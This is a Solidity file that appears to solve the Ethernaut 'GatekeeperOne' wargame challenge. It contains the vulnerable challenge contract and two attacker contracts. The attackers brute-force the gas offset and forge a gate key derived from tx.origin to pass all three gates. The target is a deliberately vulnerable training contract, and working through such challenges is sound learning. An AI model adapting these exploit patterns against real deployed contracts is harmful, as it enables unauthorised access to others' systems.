// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Hack {

    GatekeeperOne public gkOne;

    constructor (address _address) {
      gkOne = GatekeeperOne(_address);
    }

    function attack(bytes8 gateKey) external payable {
      for(uint256 i = 0; i < 500; i++){
        try gkOne.enter{gas: 8191 * 10 + i}(gateKey){
          return;
        }catch{} 
      } 
    }
}

interface IGateKeeperOne {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}

contract Hack2 {
    function enter(address _target, uint256 gas) external {
        IGateKeeperOne target = IGateKeeperOne(_target);
        // k = uint64(key)
        // 1. uint32(k) = uint16(k)
        // 2. uint32(k) != k
        // 3. uint32(k) == uint16(uint160(tx.origin))

        // 3. uint32(k) == uint16(uint160(tx.origin))
        // 1. uint32(k) = uint16(k)
        uint16 k16 = uint16(uint160(tx.origin));
        // 2. uint32(k) != k
        uint64 k64 = uint64(1 << 63) + uint64(k16);

        bytes8 key = bytes8(k64);

        require(gas < 8191, "gas > 8191");
        require(target.enter{gas: 8191 * 10 + gas}(key), "failed");
    }
}
